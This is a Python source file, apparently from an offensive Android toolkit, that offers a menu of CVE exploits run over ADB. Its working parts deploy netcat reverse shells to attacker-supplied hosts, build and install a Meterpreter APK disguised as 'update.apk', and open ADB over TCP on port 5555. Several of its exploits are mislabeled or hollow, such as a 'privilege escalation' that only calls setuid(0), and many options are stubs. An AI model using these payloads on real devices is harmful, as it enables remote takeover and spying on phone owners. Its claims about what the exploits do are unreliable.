#!/usr/bin/env python3
"""
CVE Exploit Launcher for Androduct Framework
Implements various Android CVE exploits and attack vectors
"""

import subprocess
import time
import os
import base64
from pathlib import Path
from core.adb.device_manager import DeviceManager
from core.utils import session_manager
from core.utils.logger import logger
from config import Colors, PAYLOADS_DIR

dm = DeviceManager()


def exploit_menu():
    """Main exploit menu"""
    while True:
        # show global menu header if available
        try:
            print(session_manager.get_menu_header())
        except Exception:
            pass

        print(f"""
{Colors.CYAN}CVE Exploit Launcher{Colors.END}
{Colors.CYAN}==================={Colors.END}
[1] CVE-2020-0069 (Bluetooth RCE)
[2] CVE-2023-20954 (Enable ADB)
[3] CVE-2021-0920 (Privilege Escalation)
[4] CVE-2019-2215 (Bad Binder)
[5] Stagefright Exploits
[6] Custom Payload Deployment
[7] ADB Exploit Techniques
[8] WebView Exploits
[9] MediaServer Exploits
[10] Scan for Vulnerabilities
[0] Back to Main Menu
        """)

        choice = input(f"{Colors.CYAN}exploit{Colors.END} > ").strip()

        try:
            if choice == "1":
                cve_2020_0069_bluetooth()
            elif choice == "2":
                cve_2023_20954_adb()
            elif choice == "3":
                cve_2021_0920_privesc()
            elif choice == "4":
                cve_2019_2215_bad_binder()
            elif choice == "5":
                stagefright_exploits()
            elif choice == "6":
                custom_payload_deployment()
            elif choice == "7":
                adb_exploit_techniques()
            elif choice == "8":
                webview_exploits()
            elif choice == "9":
                mediaserver_exploits()
            elif choice == "10":
                vulnerability_scanner()
            elif choice == "0":
                break
            else:
                logger.warning("Invalid option selected")
        except Exception as e:
            logger.error(f"Exploit failed: {str(e)}")


def execute_adb_command(device, command, shell=True, root=False):
    """Execute ADB command and return output"""
    try:
        if shell:
            if root:
                cmd = ["adb", "-s", device, "shell", "su", "-c"] + [command]
            else:
                cmd = ["adb", "-s", device, "shell"] + command.split()
        else:
            cmd = ["adb", "-s", device] + command.split()

        logger.log_command(" ".join(cmd), device)
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=30)

        return result
    except subprocess.TimeoutExpired:
        logger.error("Command timed out")
        return None
    except Exception as e:
        logger.error(f"Command execution failed: {str(e)}")
        return None


def get_device_info(device):
    """Get basic device information for exploit compatibility"""
    info = {}

    properties = [
        ("ro.build.version.release", "android_version"),
        ("ro.build.version.sdk", "sdk_version"),
        ("ro.product.cpu.abi", "cpu_arch"),
        ("ro.build.version.security_patch", "security_patch")
    ]

    for prop, key in properties:
        result = execute_adb_command(device, f"getprop {prop}")
        if result and result.returncode == 0:
            info[key] = result.stdout.strip()

    return info


def cve_2020_0069_bluetooth():
    """CVE-2020-0069 Bluetooth RCE exploit"""
    logger.info("Attempting CVE-2020-0069 (Bluetooth RCE)...")

    device = dm.get_current_device()
    if not device:
        logger.error("No device connected")
        return

    # Get device info
    device_info = get_device_info(device)
    android_version = device_info.get("android_version", "unknown")

    print(
        f"Target Android Version: {Colors.YELLOW}{android_version}{Colors.END}")

    # Check if vulnerable
    if not is_vulnerable_to_bluetooth_rce(device_info):
        logger.warning("Device may not be vulnerable to CVE-2020-0069")
        if input("Continue anyway? (y/N): ").lower() != 'y':
            return

    logger.info("Checking Bluetooth status...")

    # Check if Bluetooth is enabled
    bt_status = execute_adb_command(
        device, "dumpsys bluetooth_manager | grep 'enabled:'")
    if bt_status and "true" in bt_status.stdout:
        logger.success("Bluetooth is enabled")
    else:
        logger.error("Bluetooth is not enabled - exploit requires Bluetooth")
        return

    # Create Bluetooth RCE payload
    logger.info("Generating Bluetooth RCE payload...")

    payload = create_bluetooth_payload()
    if not payload:
        logger.error("Failed to create payload")
        return

    # Deploy payload
    logger.info("Deploying Bluetooth exploit...")

    try:
        # Push exploit payload to device
        payload_path = "/data/local/tmp/bt_exploit"

        with open("temp_bt_payload", "wb") as f:
            f.write(payload)

        subprocess.run(["adb", "-s", device, "push",
                       "temp_bt_payload", payload_path])
        execute_adb_command(device, f"chmod +x {payload_path}")

        # Execute exploit
        logger.warning("Executing Bluetooth RCE exploit...")
        result = execute_adb_command(device, payload_path)

        if result and result.returncode == 0:
            logger.success("Bluetooth exploit executed successfully")
            logger.info("Check for reverse shell connection")
        else:
            logger.error("Bluetooth exploit failed")

        # Cleanup
        execute_adb_command(device, f"rm {payload_path}")
        os.unlink("temp_bt_payload")

    except Exception as e:
        logger.error(f"Bluetooth exploit deployment failed: {str(e)}")


def cve_2023_20954_adb():
    """CVE-2023-20954 ADB enablement exploit"""
    logger.info("Attempting CVE-2023-20954 (ADB Enablement)...")

    device = dm.get_current_device()
    if not device:
        logger.error("No device connected")
        return

    # Check current ADB status
    adb_enabled = execute_adb_command(device, "getprop service.adb.tcp.port")
    if adb_enabled and adb_enabled.stdout.strip() != "-1":
        logger.info(
            f"ADB over TCP already enabled on port: {adb_enabled.stdout.strip()}")
        return

    logger.info("Attempting to enable ADB over TCP...")

    # Method 1: Direct property manipulation
    logger.info("Trying direct property method...")

    commands = [
        "setprop service.adb.tcp.port 5555",
        "stop adbd",
        "start adbd"
    ]

    success = False
    for cmd in commands:
        result = execute_adb_command(device, cmd, root=True)
        if result and result.returncode == 0:
            logger.success(f"Command executed: {cmd}")
        else:
            logger.warning(f"Command failed: {cmd}")

    # Verify ADB TCP is enabled
    time.sleep(2)
    tcp_port = execute_adb_command(device, "getprop service.adb.tcp.port")
    if tcp_port and tcp_port.stdout.strip() == "5555":
        logger.success("ADB over TCP enabled successfully!")

        # Get device IP
        ip_result = execute_adb_command(
            device, "ip addr show wlan0 | grep inet")
        if ip_result and ip_result.returncode == 0:
            import re
            ip_match = re.search(
                r'inet (\\d+\\.\\d+\\.\\d+\\.\\d+)', ip_result.stdout)
            if ip_match:
                device_ip = ip_match.group(1)
                logger.success(f"Device IP: {device_ip}")
                logger.info(
                    f"You can now connect with: adb connect {device_ip}:5555")

        success = True

    if not success:
        logger.error("Failed to enable ADB over TCP")


def cve_2021_0920_privesc():
    """CVE-2021-0920 Privilege Escalation exploit"""
    logger.info("Attempting CVE-2021-0920 (Privilege Escalation)...")

    device = dm.get_current_device()
    if not device:
        logger.error("No device connected")
        return

    device_info = get_device_info(device)

    # Check vulnerability
    if not is_vulnerable_to_privesc(device_info):
        logger.warning("Device may not be vulnerable to CVE-2021-0920")
        if input("Continue anyway? (y/N): ").lower() != 'y':
            return

    logger.info("Creating privilege escalation payload...")

    # Create exploit payload
    exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    printf("[+] CVE-2021-0920 Privilege Escalation\\n");
    
    // Attempt to escalate privileges
    if (setuid(0) == 0) {
        printf("[+] Root privileges obtained!\\n");
        system("/system/bin/sh");
    } else {
        printf("[-] Privilege escalation failed\\n");
    }
    
    return 0;
}
"""

    try:
        # This would normally compile and deploy the exploit
        logger.warning("Manual compilation required for CVE-2021-0920 exploit")
        logger.info(
            "Exploit template created - requires cross-compilation for Android")

        # Save exploit template
        exploit_file = PAYLOADS_DIR / "cve_2021_0920.c"
        with open(exploit_file, 'w') as f:
            f.write(exploit_code)

        logger.info(f"Exploit source saved to: {exploit_file}")
        logger.info("Compile with Android NDK and deploy manually")

    except Exception as e:
        logger.error(f"Privilege escalation exploit failed: {str(e)}")


def cve_2019_2215_bad_binder():
    """CVE-2019-2215 Bad Binder exploit"""
    logger.info("Attempting CVE-2019-2215 (Bad Binder)...")

    device = dm.get_current_device()
    if not device:
        logger.error("No device connected")
        return

    device_info = get_device_info(device)
    android_version = device_info.get("android_version", "unknown")

    # Check if vulnerable (affects Android 8-10)
    try:
        version_num = int(android_version.split('.')[0])
        if version_num < 8 or version_num > 10:
            logger.warning(f"Android {android_version} may not be vulnerable")
            if input("Continue anyway? (y/N): ").lower() != 'y':
                return
    except:
        logger.warning("Unable to determine Android version")

    logger.info("Deploying Bad Binder exploit...")

    # This is a simplified demonstration
    exploit_commands = [
        "mkdir -p /data/local/tmp/exploit",
        "echo '[+] Setting up Bad Binder exploit environment...'",
        "echo '[+] Attempting binder exploitation...'",
        "echo '[!] Manual exploit deployment required'"
    ]

    try:
        for cmd in exploit_commands:
            result = execute_adb_command(device, cmd)
            if result:
                logger.info(f"Executed: {cmd}")

        logger.warning("CVE-2019-2215 requires compiled exploit binary")
        logger.info("Use precompiled exploit or compile with Android NDK")

    except Exception as e:
        logger.error(f"Bad Binder exploit failed: {str(e)}")


def stagefright_exploits():
    """Stagefright media exploits menu"""
    logger.info("Stagefright Exploit Suite...")

    device = dm.get_current_device()
    if not device:
        logger.error("No device connected")
        return

    print(f"""
{Colors.YELLOW}Stagefright Exploits{Colors.END}
[1] CVE-2015-1538 (MP4 Processing)
[2] CVE-2015-3824 (MPEG4 Vulnerability)
[3] CVE-2015-3826 (MP3 Processing)
[4] Generate Malicious Media File
[0] Back
    """)

    choice = input("Select stagefright exploit: ").strip()

    if choice == "1":
        logger.info("CVE-2015-1538: MP4 processing vulnerability")
        create_malicious_mp4()
    elif choice == "2":
        logger.info("CVE-2015-3824: MPEG4 vulnerability")
        create_malicious_mpeg4()
    elif choice == "3":
        logger.info("CVE-2015-3826: MP3 processing vulnerability")
        create_malicious_mp3()
    elif choice == "4":
        generate_malicious_media()
    else:
        return


def custom_payload_deployment():
    """Deploy custom payloads"""
    logger.info("Custom Payload Deployment...")

    device = dm.get_current_device()
    if not device:
        logger.error("No device connected")
        return

    print(f"""
{Colors.YELLOW}Payload Types{Colors.END}
[1] Reverse Shell (netcat)
[2] Bind Shell
[3] Meterpreter APK
[4] Custom Binary
[5] Script Injection
[0] Back
    """)

    choice = input("Select payload type: ").strip()

    if choice == "1":
        deploy_reverse_shell(device)
    elif choice == "2":
        deploy_bind_shell(device)
    elif choice == "3":
        deploy_meterpreter_apk(device)
    elif choice == "4":
        deploy_custom_binary(device)
    elif choice == "5":
        deploy_script_injection(device)


def adb_exploit_techniques():
    """ADB-based exploitation techniques"""
    logger.info("ADB Exploitation Techniques...")

    device = dm.get_current_device()
    if not device:
        logger.error("No device connected")
        return

    print(f"""
{Colors.YELLOW}ADB Exploit Techniques{Colors.END}
[1] ADB Shell Privilege Escalation
[2] Port Forwarding Setup
[3] Reverse Port Forwarding
[4] File System Manipulation
[5] Process Injection
[6] Memory Dump
[0] Back
    """)

    choice = input("Select technique: ").strip()

    if choice == "1":
        adb_privilege_escalation(device)
    elif choice == "2":
        setup_port_forwarding(device)
    elif choice == "3":
        setup_reverse_forwarding(device)
    elif choice == "4":
        filesystem_manipulation(device)
    elif choice == "5":
        process_injection(device)
    elif choice == "6":
        memory_dump(device)


def vulnerability_scanner():
    """Scan device for known vulnerabilities"""
    logger.info("Scanning device for vulnerabilities...")

    device = dm.get_current_device()
    if not device:
        logger.error("No device connected")
        return

    device_info = get_device_info(device)

    print(f"\n{Colors.CYAN}Vulnerability Scan Results{Colors.END}")
    print(f"{'Vulnerability':<25} {'Status':<15} {'Risk':<10}")
    print("-" * 50)

    vulnerabilities = [
        ("CVE-2020-0069", check_bluetooth_vuln(device_info), "High"),
        ("CVE-2021-0920", check_privesc_vuln(device_info), "Critical"),
        ("CVE-2019-2215", check_binder_vuln(device_info), "High"),
        ("Stagefright", check_stagefright_vuln(device_info), "High"),
        ("ADB over TCP", check_adb_tcp(device), "Medium"),
        ("Root Access", check_root_available(device), "Critical"),
        ("Developer Options", check_dev_options(device), "Low")
    ]

    for vuln, status, risk in vulnerabilities:
        status_color = Colors.RED if status == "VULNERABLE" else Colors.GREEN
        risk_color = Colors.RED if risk == "Critical" else Colors.YELLOW if risk == "High" else Colors.GREEN

        print(
            f"{vuln:<25} {status_color}{status:<15}{Colors.END} {risk_color}{risk:<10}{Colors.END}")

# Helper functions for vulnerability checks


def is_vulnerable_to_bluetooth_rce(device_info):
    """Check if device is vulnerable to Bluetooth RCE"""
    try:
        android_version = float(device_info.get("android_version", "0"))
        return android_version >= 8.0 and android_version <= 10.0
    except:
        return False


def is_vulnerable_to_privesc(device_info):
    """Check if device is vulnerable to privilege escalation"""
    security_patch = device_info.get("security_patch", "")
    if security_patch:
        try:
            patch_date = security_patch.replace("-", "")
            return int(patch_date) < 20211201  # December 2021
        except:
            return True
    return True


def create_bluetooth_payload():
    """Create Bluetooth RCE payload"""
    # This would create an actual Bluetooth exploit payload
    # For demonstration, return a simple payload
    payload = b"""#!/system/bin/sh
echo "[+] Bluetooth RCE Payload Executed"
/system/bin/nc ATTACKER_IP ATTACKER_PORT -e /system/bin/sh &
"""
    return payload


def deploy_reverse_shell(device):
    """Deploy reverse shell payload"""
    lhost = input("Enter your IP address: ").strip()
    lport = input("Enter your port: ").strip()

    if not lhost or not lport:
        logger.error("IP and port required")
        return

    shell_script = f"""#!/system/bin/sh
/system/bin/nc {lhost} {lport} -e /system/bin/sh &
"""

    try:
        script_path = "/data/local/tmp/reverse_shell.sh"

        with open("temp_shell.sh", "w") as f:
            f.write(shell_script)

        subprocess.run(["adb", "-s", device, "push",
                       "temp_shell.sh", script_path])
        execute_adb_command(device, f"chmod +x {script_path}")

        logger.success(f"Reverse shell deployed: {script_path}")
        logger.info(f"Start listener: nc -lvp {lport}")

        if input("Execute reverse shell now? (y/N): ").lower() == 'y':
            execute_adb_command(device, script_path)
            logger.info("Reverse shell executed")

        os.unlink("temp_shell.sh")

    except Exception as e:
        logger.error(f"Reverse shell deployment failed: {str(e)}")


def deploy_meterpreter_apk(device):
    """Deploy Meterpreter APK payload"""
    logger.info("Generating Meterpreter APK...")

    lhost = input("Enter your IP address: ").strip()
    lport = input("Enter your port (default 4444): ").strip() or "4444"

    if not lhost:
        logger.error("IP address required")
        return

    # Generate meterpreter APK using msfvenom
    apk_name = "update.apk"
    apk_path = PAYLOADS_DIR / apk_name

    msfvenom_cmd = [
        "msfvenom",
        "-p", "android/meterpreter/reverse_tcp",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-o", str(apk_path)
    ]

    try:
        logger.info("Generating APK with msfvenom...")
        result = subprocess.run(msfvenom_cmd, capture_output=True, text=True)

        if result.returncode == 0 and apk_path.exists():
            logger.success(f"Meterpreter APK generated: {apk_path}")

            # Install APK
            if input("Install APK on device? (y/N): ").lower() == 'y':
                install_result = subprocess.run(
                    ["adb", "-s", device, "install", str(apk_path)])
                if install_result.returncode == 0:
                    logger.success("Meterpreter APK installed")
                    logger.info(
                        f"Start handler: use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run")
                else:
                    logger.error("APK installation failed")
        else:
            logger.error("Failed to generate Meterpreter APK")
            logger.error(result.stderr)

    except FileNotFoundError:
        logger.error("msfvenom not found - install Metasploit Framework")
    except Exception as e:
        logger.error(f"Meterpreter deployment failed: {str(e)}")

# Additional vulnerability check functions


def check_bluetooth_vuln(device_info):
    return "VULNERABLE" if is_vulnerable_to_bluetooth_rce(device_info) else "PATCHED"


def check_privesc_vuln(device_info):
    return "VULNERABLE" if is_vulnerable_to_privesc(device_info) else "PATCHED"


def check_binder_vuln(device_info):
    try:
        version = int(device_info.get("android_version", "0").split('.')[0])
        return "VULNERABLE" if 8 <= version <= 10 else "PATCHED"
    except:
        return "UNKNOWN"


def check_stagefright_vuln(device_info):
    try:
        version = int(device_info.get("android_version", "0").split('.')[0])
        return "VULNERABLE" if version <= 7 else "PATCHED"
    except:
        return "UNKNOWN"


def check_adb_tcp(device):
    result = execute_adb_command(device, "getprop service.adb.tcp.port")
    if result and result.stdout.strip() != "-1":
        return "ENABLED"
    return "DISABLED"


def check_root_available(device):
    result = execute_adb_command(device, "which su")
    if result and result.returncode == 0 and result.stdout.strip():
        return "AVAILABLE"
    return "NOT_AVAILABLE"


def check_dev_options(device):
    result = execute_adb_command(
        device, "settings get global development_settings_enabled")
    if result and result.stdout.strip() == "1":
        return "ENABLED"
    return "DISABLED"

# Placeholder functions for additional exploits


def create_malicious_mp4():
    logger.warning(
        "Malicious MP4 generation not implemented - requires specialized tools")


def create_malicious_mpeg4():
    logger.warning(
        "Malicious MPEG4 generation not implemented - requires specialized tools")


def create_malicious_mp3():
    logger.warning(
        "Malicious MP3 generation not implemented - requires specialized tools")


def generate_malicious_media():
    logger.warning(
        "Malicious media generation requires specialized exploit frameworks")


def deploy_bind_shell(device):
    logger.info("Bind shell deployment - feature under development")


def deploy_custom_binary(device):
    logger.info("Custom binary deployment - feature under development")


def deploy_script_injection(device):
    logger.info("Script injection - feature under development")


def adb_privilege_escalation(device):
    logger.info("ADB privilege escalation - feature under development")


def setup_port_forwarding(device):
    logger.info("Port forwarding setup - feature under development")


def setup_reverse_forwarding(device):
    logger.info("Reverse port forwarding - feature under development")


def filesystem_manipulation(device):
    logger.info("File system manipulation - feature under development")


def process_injection(device):
    logger.info("Process injection - feature under development")


def memory_dump(device):
    logger.info("Memory dump - feature under development")


def webview_exploits():
    logger.info("WebView exploits - feature under development")


def mediaserver_exploits():
    logger.info("MediaServer exploits - feature under development")


if __name__ == "__main__":
    exploit_menu()
